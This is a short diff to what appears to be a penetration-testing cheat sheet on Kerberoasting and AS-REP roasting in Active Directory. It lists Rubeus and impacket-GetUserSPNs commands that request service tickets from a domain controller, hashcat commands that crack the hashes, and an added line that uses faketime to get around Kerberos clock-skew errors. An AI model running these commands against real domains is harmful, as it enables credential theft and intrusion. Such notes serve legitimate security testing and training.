@@ -1853,6 +1853,7 @@ hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
 
 impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
+faketime '+25199 seconds' impacket-GetUserSPNs '<Domain>/<Username>:<password>' -dc-ip <DC-IP> -request
 
 hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
 ```
